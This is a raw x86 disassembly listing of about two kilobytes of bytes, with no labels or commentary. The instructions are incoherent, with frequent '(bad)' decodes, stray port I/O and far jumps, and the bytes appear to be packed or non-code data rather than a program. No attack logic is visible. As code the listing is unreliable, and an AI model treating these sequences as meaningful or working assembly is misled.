  420aca:	inc    ecx
  420acb:	js     0x420aeb
  420acd:	pop    esi
  420ace:	mov    al,0xa2
  420ad0:	mov    edi,0x11d2153b
  420ad5:	test   al,0xce
  420ad7:	push   ecx
  420ad8:	test   bh,al
  420ada:	dec    ebp
  420adb:	pusha  
  420adc:	inc    ecx
  420add:	das    
  420ade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420adf:	sub    DWORD PTR [ecx-0x52],0x4c
  420ae3:	jmp    0x2a86:0x1ee72590
  420aea:	fisubr DWORD PTR [ebx-0x78]
  420aed:	cmp    ah,bh
  420aef:	vmaxsd xmm6,xmm4,QWORD PTR [ebx+edi*2]
  420af4:	mov    ebx,0x103acf5a
  420af9:	inc    ecx
  420afa:	cdq    
  420afb:	imul   edi,esp,0x50
  420afe:	aad    0x9b
  420b00:	ret    0x90d0
  420b03:	pop    eax
  420b04:	lahf   
  420b05:	xchg   ebx,eax
  420b06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b07:	or     edi,ecx
  420b09:	outs   dx,DWORD PTR ds:[esi]
  420b0a:	loope  0x420b16
  420b0c:	xor    edx,DWORD PTR [edi+0x40cedbcf]
  420b12:	xor    BYTE PTR [edx+eiz*1-0x5c26f626],bh
  420b19:	dec    eax
  420b1a:	mov    edi,0xf089410d
  420b1f:	dec    eax
  420b20:	mov    dh,0xa8
  420b22:	add    DWORD PTR [esp+eax*4-0x3d],ebp
  420b26:	jl     0x420b32
  420b28:	mov    ds:0x22beec04,al
  420b2d:	or     eax,esi
  420b2f:	(bad)  
  420b30:	hlt    
  420b31:	and    eax,DWORD PTR [eax-0x40]
  420b34:	mov    edx,0x725a1c1e
  420b39:	je     0x420b09
  420b3b:	sbb    DWORD PTR [ecx],edi
  420b3d:	push   0xb5de6ce3
  420b42:	adc    DWORD PTR [ecx-0x5bf66da8],edi
  420b48:	mov    esp,DWORD PTR ds:0xe2e1d2bc
  420b4e:	push   0x65b8a42c
  420b53:	or     al,0x79
  420b55:	xchg   esi,eax
  420b56:	push   edx
  420b57:	dec    ecx
  420b58:	add    al,0xf2
  420b5a:	mov    edi,0xb2fc5fb2
  420b5f:	mov    eax,0x6eb235d0
  420b64:	mov    ebp,0xd458266b
  420b69:	imul   edx,DWORD PTR [ecx+ecx*1+0x4d],0xffffffde
  420b6e:	inc    esp
  420b6f:	and    DWORD PTR [edi],edx
  420b71:	pop    ecx
  420b72:	mov    dh,0x4e
  420b74:	xor    ah,dl
  420b76:	in     al,dx
  420b77:	adc    dh,dh
  420b79:	iret   
  420b7a:	xchg   edi,eax
  420b7b:	and    edx,DWORD PTR [ecx*8+0x2bddd9a]
  420b82:	inc    esi
  420b83:	pop    es
  420b84:	not    eax
  420b86:	rol    ebp,cl
  420b88:	adc    ebx,ecx
  420b8a:	mov    ch,0xa4
  420b8c:	pop    es
  420b8d:	in     eax,0x9e
  420b8f:	shr    DWORD PTR [edi-0x580de62d],1
  420b95:	mov    ebx,0xe470501e
  420b9a:	sbb    edi,esp
  420b9c:	retf   0x2b
  420b9f:	js     0x420bbb
  420ba1:	mov    ds:0xed48e569,eax
  420ba6:	pushf  
  420ba7:	fnstsw WORD PTR [ebx-0x7bb443dc]
  420bad:	push   es
  420bae:	push   ss
  420baf:	ins    BYTE PTR es:[edi],dx
  420bb0:	ds stos BYTE PTR es:[edi],al
  420bb2:	(bad)  
  420bb3:	sbb    al,0xf7
  420bb5:	xor    DWORD PTR [edx+0x34],ebx
  420bb8:	jl     0x420bf9
  420bba:	and    ah,al
  420bbc:	shl    DWORD PTR [ecx],cl
  420bbe:	and    al,0x1
  420bc0:	push   cs
  420bc1:	xchg   edx,eax
  420bc2:	ins    DWORD PTR es:[edi],dx
  420bc3:	cmp    edi,DWORD PTR [edi]
  420bc5:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  420bc7:	out    0x19,al
  420bc9:	repz and eax,0x8536c316
  420bcf:	in     al,0x97
  420bd1:	mov    eax,ds:0x47cc8827
  420bd6:	adc    al,BYTE PTR [ecx-0x5aa41e52]
  420bdc:	add    al,0x1a
  420bde:	mov    BYTE PTR [eax],al
  420be0:	inc    esi
  420be1:	mov    ds:0x4251869,al
  420be6:	adc    eax,0x4900235d
  420beb:	shl    DWORD PTR [ebp-0xe9879a8],cl
  420bf1:	ins    DWORD PTR es:[edi],dx
  420bf2:	xchg   edi,eax
  420bf3:	js     0x420bdd
  420bf5:	xor    DWORD PTR [edi],esp
  420bf7:	out    0xc8,al
  420bf9:	mov    ah,0x58
  420bfb:	push   ss
  420bfc:	pop    eax
  420bfd:	das    
  420bfe:	push   edx
  420bff:	pop    edx
  420c00:	sbb    esp,DWORD PTR [edx-0x460104a6]
  420c06:	sub    dh,0xc1
  420c09:	dec    ecx
  420c0a:	idiv   BYTE PTR [esi]
  420c0c:	or     eax,0x81879871
  420c11:	jmp    0x2efd:0xd4e63ce7
  420c18:	lahf   
  420c19:	inc    si
  420c1b:	pop    ebx
  420c1c:	mov    ds:0x359d8567,al
  420c21:	(bad)  
  420c23:	inc    edi
  420c24:	pop    ss
  420c25:	(bad)  
  420c26:	fldenv [ecx+edx*1+0x3cf94a0d]
  420c2d:	loopne 0x420bb0
  420c2f:	aad    0x72
  420c31:	adc    BYTE PTR [edx-0x2d],cl
  420c34:	repnz stos BYTE PTR es:[edi],al
  420c36:	or     eax,0xf2c06a21
  420c3b:	addr16 cld 
  420c3d:	gs cmp al,0xbf
  420c40:	test   al,0x58
  420c42:	ds enter 0xc6e4,0x45
  420c47:	fcomi  st,st(7)
  420c49:	or     BYTE PTR [eax+0x77cc189b],0x23
  420c50:	mov    BYTE PTR [ebp-0x53],dl
  420c53:	int    0x93
  420c55:	psadbw mm7,QWORD PTR [ecx-0x7c22d3dc]
  420c5c:	aam    0xc9
  420c5e:	fild   QWORD PTR [ecx]
  420c60:	jl     0x420bf8
  420c62:	mov    eax,ds:0xfb36032
  420c67:	pop    ebx
  420c68:	sahf   
  420c69:	neg    cl
  420c6b:	int    0xa8
  420c6d:	ins    DWORD PTR es:[edi],dx
  420c6e:	test   BYTE PTR [edx-0x4f],dl
  420c71:	gs inc eax
  420c73:	out    0x19,eax
  420c75:	out    0xfe,al
  420c77:	and    DWORD PTR [edi],edi
  420c79:	sub    DWORD PTR [ebp+0x63],edi
  420c7c:	shl    DWORD PTR [eax+0x38],1
  420c7f:	push   eax
  420c80:	ja     0x420c8c
  420c82:	add    BYTE PTR [ebx+0x71],bl
  420c85:	ror    DWORD PTR [ebx],cl
  420c87:	xor    BYTE PTR [ebx],ah
  420c89:	jge    0x420c7c
  420c8b:	jmp    0x420ce1
  420c8d:	xchg   DWORD PTR [edx],ebp
  420c8f:	sub    DWORD PTR [esi-0x61],0xfffffff4
  420c93:	jno    0x420c2b
  420c95:	xlat   BYTE PTR ds:[ebx]
  420c96:	or     esi,esp
  420c98:	inc    ebp
  420c99:	in     eax,dx
  420c9a:	add    DWORD PTR [ebx+0x6bf941d3],edx
  420ca0:	in     al,0x43
  420ca2:	xchg   esp,eax
  420ca3:	mov    BYTE PTR [ebx],ch
  420ca5:	int3   
  420ca6:	mov    eax,0x3cb52e19
  420cab:	pop    edx
  420cac:	dec    esp
  420cad:	add    dh,BYTE PTR [edx-0x78]
  420cb0:	std    
  420cb1:	mov    ebp,0xae67627f
  420cb6:	cmp    dl,BYTE PTR [edi-0x78d10cf]
  420cbc:	les    esp,FWORD PTR ss:[edx+ebx*8+0x73fbfb19]
  420cc4:	shl    DWORD PTR [eax+0x279ceed],0x76
  420ccb:	sahf   
  420ccc:	push   edx
  420ccd:	push   0xc02c8b7
  420cd2:	lea    eax,[edi+0x1eb3d066]
  420cd8:	lods   al,BYTE PTR ds:[esi]
  420cd9:	fmul   QWORD PTR [edx+0x60]
  420cdc:	push   0xffffffe1
  420cde:	sub    ecx,0xf3fa6901
  420ce4:	or     al,0xd
  420ce6:	jp     0x420cee
  420ce8:	cmp    DWORD PTR ds:0x7db4803,edi
  420cee:	pop    ebp
  420cef:	fs addr16 gs jne 0x420d0b
  420cf4:	loop   0x420cd9
  420cf6:	fnstenv [ebp+ebp*1-0x4f15de61]
  420cfd:	jp     0x420d4c
  420cff:	imul   ebx,DWORD PTR [ebp-0x75],0xffffffab
  420d03:	pop    ss
  420d04:	xchg   ecx,eax
  420d05:	inc    ebp
  420d06:	pop    edi
  420d07:	jns    0x420cd5
  420d09:	jmp    0x420d4c
  420d0b:	into   
  420d0c:	out    dx,eax
  420d0d:	mov    dl,0x94
  420d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d10:	repnz xor eax,DWORD PTR [eax-0x2ec50ae9]
  420d17:	mov    edi,0x4deaea90
  420d1c:	test   eax,0x32e2c11b
  420d21:	jg     0x420d50
  420d23:	xchg   DWORD PTR [ecx-0x61],ecx
  420d26:	loopne 0x420d6f
  420d28:	mov    eax,0x9aeb078
  420d2d:	inc    edi
  420d2e:	sub    eax,0x76cd2429
  420d33:	out    0xbb,al
  420d35:	mov    ds:0xa6b74ed0,eax
  420d3a:	xor    eax,0x46faf73e
  420d3f:	mov    edx,0x1c179813
  420d44:	rcl    BYTE PTR [edx+0x7b63daa7],0x28
  420d4b:	mov    ds:0xec6ad1d6,eax
  420d50:	ins    BYTE PTR es:[edi],dx
  420d51:	popa   
  420d52:	mov    ch,0xc6
  420d54:	std    
  420d55:	pandn  mm3,QWORD PTR [ebp-0x55edb919]
  420d5c:	mov    BYTE PTR [edx],0x8e
  420d5f:	pop    ebp
  420d60:	call   0xfb691
  420d65:	scas   eax,DWORD PTR es:[edi]
  420d66:	lods   eax,DWORD PTR ds:[esi]
  420d67:	xchg   edi,eax
  420d68:	add    BYTE PTR [esi-0x2d328f7b],dl
  420d6e:	fild   QWORD PTR [eax]
  420d70:	ds pop edi
  420d72:	inc    ebx
  420d73:	test   DWORD PTR [ebx+0x7e],0xbb8f721
  420d7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d7b:	(bad)  
  420d7c:	jmp    0x420dbb
  420d7e:	inc    eax
  420d7f:	xchg   ebp,eax
  420d80:	sbb    ecx,DWORD PTR [ebx+ecx*1]
  420d83:	xlat   BYTE PTR ds:[ebx]
  420d84:	or     al,0x62
  420d86:	pop    es
  420d87:	(bad)  
  420d88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d89:	dec    edi
  420d8a:	loope  0x420d23
  420d8c:	es cld 
  420d8e:	pop    ss
  420d8f:	fild   QWORD PTR [edi]
  420d91:	push   ss
  420d92:	in     eax,dx
  420d93:	and    eax,0x58f1113d
  420d98:	scas   eax,DWORD PTR es:[edi]
  420d99:	(bad)  
  420d9b:	pop    eax
  420d9c:	sub    al,0x83
  420d9e:	lock pop ecx
  420da0:	out    0x58,al
  420da2:	pop    edi
  420da3:	pop    ebx
  420da4:	cdq    
  420da5:	(bad)  
  420da6:	outs   dx,DWORD PTR ds:[esi]
  420da7:	(bad)  
  420da8:	mov    WORD PTR [ebp-0xe58df6c],es
  420dae:	stos   BYTE PTR es:[edi],al
  420daf:	ins    BYTE PTR es:[edi],dx
  420db0:	pop    edi
  420db1:	push   ebp
  420db2:	xor    eax,0x70f231a7
  420db7:	retf   0x68a1
  420dba:	dec    esp
  420dbc:	jno    0x420e0d
  420dbe:	dec    ebx
  420dbf:	out    0x4,al
  420dc1:	push   ecx
  420dc2:	push   edi
  420dc3:	cmp    esp,DWORD PTR [edx-0x7161277d]
  420dc9:	mov    ch,dh
  420dcb:	add    ah,BYTE PTR [edx-0x64]
  420dce:	sbb    dl,dh
  420dd0:	fldenv [edx+0xba4000c]
  420dd6:	xchg   ebx,eax
  420dd7:	cmp    BYTE PTR [ecx-0x3118a7bf],cl
  420ddd:	and    DWORD PTR [edx],0x4f7aa8a0
  420de3:	hlt    
  420de4:	jo     0x420e31
  420de6:	es hlt 
  420de8:	jp     0x420e38
  420dea:	xchg   BYTE PTR [ebx],ah
  420dec:	mov    ecx,0x80b276b
  420df1:	int3   
  420df2:	xchg   ecx,eax
  420df3:	iret   
  420df4:	imul   edx,DWORD PTR [ebx],0xaea8ac12
  420dfa:	mov    dl,BYTE PTR [ebp+0x1f5d7ded]
  420e00:	fs es clc 
  420e03:	dec    ebx
  420e04:	dec    esp
  420e05:	das    
  420e06:	fldcw  WORD PTR [ecx+0x43]
  420e09:	ficom  DWORD PTR [ebp-0x17]
  420e0c:	xor    edi,DWORD PTR [ebp+0x554812c1]
  420e12:	icebp  
  420e13:	ins    BYTE PTR es:[edi],dx
  420e14:	xor    BYTE PTR [edx-0x37],ch
  420e17:	addr16 mov edx,0xa4491dfb
  420e1d:	jae    0x420dd6
  420e1f:	push   eax
  420e20:	dec    eax
  420e21:	inc    esi
  420e22:	das    
  420e23:	mov    eax,0x193af4bc
  420e28:	push   ebp
  420e29:	jecxz  0x420e83
  420e2b:	push   esp
  420e2c:	xchg   esp,eax
  420e2d:	test   al,0xff
  420e2f:	retf   0xbf07
  420e32:	or     eax,0x42c870d7
  420e37:	fwait
  420e38:	mov    bh,0xcc
  420e3a:	xlat   BYTE PTR ds:[ebx]
  420e3b:	aad    0x6e
  420e3d:	inc    eax
  420e3e:	(bad)  
  420e3f:	push   cs
  420e40:	and    al,0x4c
  420e42:	in     al,0x9a
  420e44:	mov    ebx,0x42ee0bd3
  420e49:	aam    0xf0
  420e4b:	gs (bad) 
  420e4d:	js     0x420e44
  420e4f:	add    BYTE PTR [esi-0x8885cad],ch
  420e55:	mov    esp,0x27350739
  420e5a:	adc    DWORD PTR [ebx+0x3912ffd8],ebp
  420e60:	jne    0x420e3a
  420e62:	mov    al,0xeb
  420e64:	popa   
  420e65:	cs pop esp
  420e67:	mov    ecx,0x905bd0cb
  420e6c:	pop    es
  420e6d:	xchg   edi,eax
  420e6e:	add    al,0xc3
  420e70:	dec    edx
  420e71:	mul    cl
  420e73:	scas   al,BYTE PTR es:[edi]
  420e74:	bound  ebx,QWORD PTR [esi+0x63e07779]
  420e7a:	cli    
  420e7b:	push   edx
  420e7c:	je     0x420e9b
  420e7e:	int    0x3e
  420e80:	int3   
  420e81:	dec    ebp
  420e82:	into   
  420e83:	push   esi
  420e84:	shl    dh,0xd2
  420e87:	mov    ds:0xb996e477,al
  420e8c:	fnstsw WORD PTR [esi-0x4b]
  420e8f:	ret    
  420e90:	mov    ebx,0xb6dd756c
  420e95:	pop    edi
  420e96:	je     0x420ead
  420e98:	push   ebx
  420e99:	mov    edx,0x9bc112e2
  420e9e:	pusha  
  420e9f:	add    edx,DWORD PTR [ebx-0x7b]
  420ea2:	mov    dh,0x4e
  420ea4:	sub    bh,dh
  420ea6:	xchg   ecx,eax
  420ea7:	xor    BYTE PTR ds:0x600d227b,dh
  420ead:	imul   edx,esi,0xffffffa9
  420eb0:	jb     0x420e61
  420eb2:	push   ebp
  420eb3:	imul   edi,DWORD PTR [ecx-0x2b8d7159],0x9ff28bc7
  420ebd:	add    eax,0x1adafe9f
  420ec2:	hlt    
  420ec3:	pusha  
  420ec4:	adc    dh,ch
  420ec6:	sbb    bh,BYTE PTR [ebx+0x3615e563]
  420ecc:	or     BYTE PTR [ebx-0x10],cl
  420ecf:	loope  0x420f0a
  420ed1:	inc    ebx
  420ed2:	arpl   WORD PTR [eax+0x160c18e1],bx
  420ed8:	sbb    dl,0x76
  420edb:	push   edi
  420edc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420edd:	mov    ch,BYTE PTR [esi]
  420edf:	fdiv   st,st(4)
  420ee1:	mov    BYTE PTR [ecx+0x64],dh
  420ee4:	mov    al,0x7f
  420ee6:	adc    eax,0xb8149147
  420eeb:	loope  0x420ec7
  420eed:	mov    ecx,ecx
  420eef:	mov    dh,0x7d
  420ef1:	mov    ecx,0xe1b65647
  420ef6:	test   DWORD PTR [eax],ebx
  420ef8:	mov    ds:0x1b90353b,al
  420efd:	mov    ds:0xecbe6461,al
  420f02:	mov    cl,0xc3
  420f04:	mov    esp,0x4abb890b
  420f09:	mov    al,ds:0x19655207
  420f0e:	sbb    BYTE PTR [eax-0x6843af1c],bl
  420f14:	dec    edi
  420f15:	xchg   edi,eax
  420f16:	bound  ebx,QWORD PTR [ebx]
  420f18:	retf   0x256d
  420f1b:	dec    edx
  420f1c:	mov    ah,0x8d
  420f1e:	test   ch,ch
  420f20:	push   edx
  420f21:	inc    esp
  420f22:	xor    DWORD PTR [ecx-0x5a],edx
  420f25:	aad    0xa5
  420f27:	mov    dh,BYTE PTR [ebx]
  420f29:	add    DWORD PTR [ecx],0x3ef658a1
  420f2f:	ins    BYTE PTR es:[edi],dx
  420f30:	jge    0x420efe
  420f32:	add    eax,0xd6fb4cca
  420f37:	or     esp,DWORD PTR [eax]
  420f39:	inc    esp
  420f3a:	xlat   BYTE PTR ds:[ebx]
  420f3b:	jbe    0x420fad
  420f3d:	xchg   ecx,eax
  420f3e:	(bad)  [eax+0x31dbafd0]
  420f44:	cdq    
  420f45:	xor    al,0x9c
  420f47:	push   ss
  420f48:	push   edi
  420f49:	xchg   edx,eax
  420f4a:	sbb    dl,BYTE PTR [esp+eax*8]
  420f4d:	rcl    edx,0xc3
  420f50:	sahf   
  420f51:	call   0x1fc1a3de
  420f56:	cmp    cl,BYTE PTR [edx-0x1783292e]
  420f5c:	mov    fs,WORD PTR [esp+edx*2]
  420f5f:	jne    0x420f9e
  420f61:	add    eax,0xf57f6468
  420f66:	mov    dl,0xb6
  420f68:	in     eax,dx
  420f69:	pop    ecx
  420f6a:	test   DWORD PTR [ebx],0x18b5b61e
  420f70:	imul   esp,esp,0x15c67430
  420f76:	inc    ebx
  420f77:	clc    
  420f78:	mov    ds,WORD PTR [edx+eax*1-0x349d207e]
  420f7f:	fstp   DWORD PTR [esi]
  420f81:	adc    ebx,DWORD PTR [ebx-0x50e5838b]
  420f87:	aas    
  420f88:	jp     0x420f90
  420f8a:	and    eax,0x7810d1a
  420f8f:	cmp    dl,BYTE PTR [edx+0x0]
  420f92:	hlt    
  420f93:	ins    DWORD PTR es:[edi],dx
  420f94:	or     DWORD PTR es:[ebp+0x10395086],ecx
  420f9b:	aad    0x33
  420f9d:	shr    DWORD PTR [esi+ecx*1],cl
  420fa0:	pop    es
  420fa1:	outs   dx,BYTE PTR ds:[esi]
  420fa2:	test   BYTE PTR [esi+0x60e9d88a],dl
  420fa8:	inc    edx
  420fa9:	stos   DWORD PTR es:[edi],eax
  420faa:	cmp    DWORD PTR [ebx],esi
  420fac:	dec    esi
  420fad:	cld    
  420fae:	dec    edx
  420faf:	test   BYTE PTR [ebp+0x2],al
  420fb2:	push   eax
  420fb3:	adc    eax,0x352433e3
  420fb8:	mov    al,0xc1
  420fba:	cmp    cl,dl
  420fbc:	mov    edx,0xdac34503
  420fc1:	mov    ecx,DWORD PTR [ecx-0x65]
  420fc4:	imul   ecx,DWORD PTR [ecx],0xe2c135bf
  420fca:	js     0x420fec
  420fcc:	stos   BYTE PTR es:[edi],al
  420fcd:	dec    esi
  420fce:	(bad)  
  420fcf:	xor    dl,BYTE PTR [edi]
  420fd1:	mov    ebp,0x1013bc3c
  420fd6:	or     edi,edi
  420fd8:	xlat   BYTE PTR ds:[ebx]
  420fd9:	aad    0x9c
  420fdb:	xchg   ecx,eax
  420fdc:	psubw  mm3,QWORD PTR [edx]
  420fdf:	mov    ebx,0x9baeed44
  420fe4:	cmp    DWORD PTR [ebx-0x7e850422],edx
  420fea:	je     0x420f79
  420fec:	xchg   edx,eax
  420fed:	aad    0x2c
  420fef:	rol    ch,1
  420ff1:	xchg   edi,eax
  420ff2:	or     eax,0xd7d81555
  420ff7:	sub    BYTE PTR [esi+0x58],al
  420ffa:	add    esi,DWORD PTR ds:0xd9f67142
  421000:	test   eax,0xc80f3378
  421005:	(bad)  
  421006:	cmp    DWORD PTR [eax],esi
  421008:	scas   eax,DWORD PTR es:[edi]
  421009:	(bad)  
  42100a:	pop    edi
  42100b:	mov    ds:0xde290ce0,eax
  421010:	adc    al,BYTE PTR [esi+0x7379150d]
  421016:	(bad)  
  421017:	out    dx,al
  421018:	cmp    DWORD PTR [ebx],esi
  42101a:	jns    0x420fc9
  42101c:	or     DWORD PTR ds:0x5cf80c22,ebp
  421022:	hlt    
  421023:	add    DWORD PTR [edi],edx
  421025:	js     0x42108c
  421027:	and    eax,0x1734cbc1
  42102c:	pop    ss
  42102d:	jmp    DWORD PTR [ebp+0x6d]
  421030:	or     al,0x3a
  421032:	in     al,dx
  421033:	lock (bad) 
  421035:	cld    
  421036:	mov    dh,0x74
  421038:	jbe    0x420fff
  42103a:	cmp    al,0xe3
  42103c:	xor    dl,BYTE PTR [ebp+0x2bfc6244]
  421042:	ret    
  421043:	aam    0xe8
  421045:	stos   DWORD PTR es:[edi],eax
  421046:	pushw  ss
  421048:	test   BYTE PTR [edi-0x65a7dc0e],dh
  42104e:	out    0x6e,al
  421050:	idiv   BYTE PTR [ecx+0xcf6b593]
  421056:	in     al,dx
  421057:	mov    ebp,0xd2962cad
  42105c:	add    DWORD PTR [eax+0x4f],0x37
  421060:	cmp    esi,DWORD PTR [ecx-0x5352242]
  421066:	dec    eax
  421067:	pop    ebp
  421068:	outs   dx,BYTE PTR ds:[esi]
  421069:	xor    eax,0x8e22dc83
  42106e:	stos   DWORD PTR es:[edi],eax
  42106f:	mov    BYTE PTR ds:0xa3d1e913,cl
  421075:	adc    edx,esp
  421077:	xchg   esi,eax
  421078:	sbb    eax,0x2ecc5b29
  42107d:	out    dx,al
  42107e:	mov    ds:0x8c218daa,eax
  421083:	pavgw  mm4,QWORD PTR [edx-0x37]
  421087:	test   al,0x80
  421089:	popa   
  42108a:	popa   
  42108b:	out    0xe6,al
  42108d:	inc    esi
  42108e:	(bad)  
  42108f:	inc    esi
  421090:	xchg   esi,eax
  421091:	test   al,0xb6
  421093:	push   edx
  421094:	addr16 hlt 
  421096:	inc    edx
  421097:	xor    eax,DWORD PTR [edx-0x2f8d4374]
  42109d:	or     ah,BYTE PTR [eax+0x7b]
  4210a0:	adc    bh,BYTE PTR [edx-0x38527cb8]
  4210a6:	ficomp DWORD PTR [eax]
  4210a8:	pusha  
  4210a9:	push   ebp
  4210aa:	adc    eax,0xc6c6014d
  4210af:	std    
  4210b0:	lods   eax,DWORD PTR ds:[esi]
  4210b1:	out    0x11,eax
  4210b3:	mov    bh,0xf8
  4210b5:	jne    0x421107
  4210b7:	dec    edx
  4210b8:	ret    
  4210b9:	lock sub eax,0xc3b4229a
  4210bf:	aam    0xb4
  4210c1:	inc    ebx
  4210c2:	sub    al,0x4a
  4210c4:	sub    eax,0xbb8e332a
  4210c9:	mov    ebx,0x980cd84e
  4210ce:	pop    eax
  4210cf:	ins    BYTE PTR es:[edi],dx
  4210d0:	ins    BYTE PTR es:[edi],dx
  4210d1:	pop    ebp
  4210d2:	int3   
  4210d3:	and    eax,0x4cea707d
  4210d8:	iret   
  4210d9:	scas   eax,DWORD PTR es:[edi]
  4210da:	sub    al,0xa3
  4210dc:	mov    cl,0xce
  4210de:	vmread DWORD PTR [ebp+0xb4c694a],esi
  4210e5:	sti    
  4210e6:	cmp    edx,DWORD PTR [esi+ebx*8-0x2cfe88c3]
  4210ed:	and    BYTE PTR [ecx+0x17],0xd6
  4210f1:	xlat   BYTE PTR ds:[ebx]
  4210f2:	pop    ecx
  4210f3:	mov    al,ds:0xf0c775ec
  4210f8:	pop    es
  4210f9:	iret   
  4210fa:	inc    esi
  4210fb:	push   ss
  4210fc:	dec    ecx
  4210fd:	mov    esi,0xcc7ad267
  421102:	dec    ecx
  421103:	hlt    
  421104:	daa    
  421105:	shl    bl,0xc8
  421108:	push   ds
  421109:	rcr    ecx,1
  42110b:	mov    DWORD PTR [edi-0x51050b98],edx
  421111:	sbb    ch,BYTE PTR [edx-0x2c155db2]
  421117:	test   eax,0xf8b9a8af
  42111c:	xchg   ebx,eax
  42111d:	mov    ds:0xaccaa9fa,al
  421122:	and    BYTE PTR [ecx-0x3d5ac7d1],0x8
  421129:	pop    eax
  42112a:	sbb    eax,0xa8c42df4
  42112f:	or     eax,ebx
  421131:	ror    DWORD PTR [ebx],1
  421133:	out    dx,eax
  421134:	jae    0x421116
  421136:	aam    0xac
  421138:	add    ebp,DWORD PTR [ecx-0x2405301]
  42113e:	(bad)  
  421140:	cdq    
  421141:	dec    ebx
  421142:	lds    ebx,FWORD PTR [eax-0x668ded20]
  421148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421149:	into   
  42114a:	pop    ds
  42114b:	push   es
  42114c:	adc    DWORD PTR [ebx-0x53299d43],ebx
  421152:	loope  0x421190
  421154:	and    al,0x2c
  421156:	shr    DWORD PTR [eax+0x2f5875d0],0xb0
  42115d:	pop    edi
  42115e:	retf   
  42115f:	addr16 mov cl,0xd5
  421162:	out    dx,eax
  421163:	arpl   WORD PTR [esi],cx
  421165:	stos   DWORD PTR es:[edi],eax
  421166:	cmp    DWORD PTR [ebp+0x2a],esi
  421169:	sub    ebp,DWORD PTR ds:0x326500c2
  42116f:	ror    BYTE PTR [eax],cl
  421171:	lahf   
  421172:	aad    0x28
  421174:	lea    ebp,ds:0x459115d8
  42117a:	out    0x78,eax
  42117c:	or     esp,DWORD PTR [edi+0x2c39bff2]
  421182:	sub    esi,DWORD PTR [edi-0x515f3612]
  421188:	mov    ds:0xa7f5e82a,eax
  42118d:	dec    eax
  42118e:	fsubr  DWORD PTR [ecx-0x3f6de98]
  421194:	xchg   ebx,eax
  421195:	scas   al,BYTE PTR es:[edi]
  421196:	or     al,0xd3
  421198:	imul   esp,DWORD PTR ds:0x9e4be08d,0x897e613
  4211a2:	add    BYTE PTR [ebx+eax*2-0x37],bl
  4211a6:	loopne 0x4211b5
  4211a8:	push   0x1990b6f6
  4211ad:	mov    bl,0x5f
  4211af:	js     0x421206
  4211b1:	loopne 0x421182
  4211b3:	ins    DWORD PTR es:[edi],dx
  4211b4:	add    DWORD PTR [esi-0x6c],ebx
  4211b7:	add    BYTE PTR [esp+edx*4-0x5e19f83a],bh
  4211be:	jle    0x421202
  4211c0:	arpl   WORD PTR [edi+0xa],bp
  4211c3:	or     ch,0xdb
  4211c6:	mov    DWORD PTR [edx+0x4a],esp
  4211c9:	mov    esi,fs
  4211cb:	adc    bh,BYTE PTR ds:0x52c250d6
  4211d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211d2:	(bad)  
  4211d3:	sub    al,0x6a
  4211d5:	pop    es
  4211d6:	fsub   QWORD PTR [edx-0x1ce435cb]
  4211dc:	clc    
  4211dd:	mov    ds:0xb9f0b2ac,al
  4211e2:	mov    ds:0x5a07a785,al
  4211e7:	pop    ss
  4211e8:	call   ecx
  4211ea:	mov    cl,0x3d
  4211ec:	jb     0x4211df
  4211ee:	push   ds
  4211ef:	pop    ss
  4211f0:	ds clc 
  4211f2:	cmp    DWORD PTR [ebx-0x4d],edx
  4211f5:	retf   0xddad
  4211f8:	outs   dx,BYTE PTR ds:[esi]
  4211f9:	pop    eax
  4211fa:	arpl   sp,di
  4211fc:	loop   0x4211a2
  4211fe:	xchg   edi,eax
  4211ff:	fidivr WORD PTR [ecx+esi*4-0x23]
  421203:	mov    al,0xc5
  421205:	adc    ebp,ecx
  421207:	xor    eax,0xfa794fa4
  42120c:	cmp    eax,0x15ab5000
  421211:	mov    BYTE PTR [edi-0x3],bh
  421214:	lods   eax,DWORD PTR ds:[esi]
  421215:	mov    ah,0xee
  421217:	lds    ebp,FWORD PTR [ecx+0x45]
  42121a:	mov    edx,?
  42121c:	push   esi
  42121d:	jge    0x421299
  42121f:	hlt    
  421220:	push   ds
  421221:	or     bl,BYTE PTR [ecx-0x276458d9]
  421227:	cmp    eax,0x155e0ffc
  42122c:	jno    0x421275
  42122e:	test   eax,0x619c622e
  421233:	(bad)  
  421235:	mov    ecx,0x60f5d525
  42123a:	clc    
  42123b:	(bad)  
  42123c:	fsub   QWORD PTR [ebx]
  42123e:	xor    dh,dl
  421240:	inc    edi
  421241:	jo     0x421273
  421243:	jle    0x42128d
  421245:	push   ss
  421246:	push   ebp
  421247:	popf   
  421248:	jne    0x42123c
  42124a:	imul   eax
  42124c:	aas    
  42124d:	jbe    0x4212ad
  42124f:	in     eax,dx
  421250:	pop    esi
  421251:	daa    
  421252:	inc    esi
  421253:	ret    
  421254:	retf   0xf57c
  421257:	jmp    0x22159be5
  42125c:	(bad)  
  42125d:	fcmovnb st,st(0)
  42125f:	jmp    0x42128a
  421261:	jne    0x421219
  421263:	cmp    edi,DWORD PTR [ebx-0x271f1423]
  421269:	stos   DWORD PTR es:[edi],eax
  42126a:	push   0xffffffa4
  42126c:	test   BYTE PTR [edx-0x5],al
  42126f:	je     0x42125d
  421271:	lods   eax,DWORD PTR ds:[esi]
  421272:	ds in  al,0xce
  421275:	mov    WORD PTR [ebp+0x72],ss
  421278:	jmp    0x6f1e:0xa56b5a6c
  42127f:	test   BYTE PTR [esi],dh
  421281:	mov    al,0x3d
  421283:	xor    ebp,esi
  421285:	pop    ebx
  421286:	cmp    DWORD PTR [edi],edi
  421288:	jl     0x4212c2
  42128a:	out    0x75,eax
  42128c:	cmp    eax,0x467f9ab5
  421291:	das    
  421292:	retf   
  421293:	xchg   edx,eax
  421294:	xchg   esi,eax
  421295:	ins    BYTE PTR es:[edi],dx
  421296:	jnp    0x4212bb
  421298:	sbb    ebp,esp
  42129a:	jo     0x42124d
  42129c:	cli    
  42129d:	jo     0x421244
  42129f:	sahf   
  4212a0:	stos   BYTE PTR es:[edi],al
  4212a1:	shl    edx,1
  4212a3:	sub    eax,0x41672e84
  4212a8:	xor    ah,BYTE PTR [eax+0xe]
  4212ab:	dec    ecx
